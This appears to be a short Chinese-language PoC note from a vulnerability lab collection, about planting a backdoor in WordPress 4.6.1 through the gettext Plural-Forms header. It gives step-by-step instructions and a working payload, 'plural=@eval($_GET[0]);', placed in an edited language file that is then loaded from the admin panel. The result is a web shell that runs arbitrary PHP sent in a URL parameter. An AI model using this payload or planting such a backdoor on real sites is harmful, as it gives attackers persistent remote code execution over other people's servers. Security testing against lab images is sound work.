## gettext + create_function 构建 wordpress 后门

测试镜像

* src/wordpress/4.6.1/

参考链接

* [Wordpress <= 4.6.1 使用语言文件任意代码执行漏洞分析](https://paper.seebug.org/63/)

Poc

1. [下载语言文件](https://translate.wordpress.org/projects/wp/4.6.x/zh-cn/default)
2. 编辑 PO 文件，修改 `Plural-Forms`
   * e.g `"Plural-Forms: nplurals=1; plural=@eval($_GET[0]);\n"`
3. 在 wordpress 后台使用这个语言文件   
4. 访问 /index.php?0=phpinfo(); 进行测试

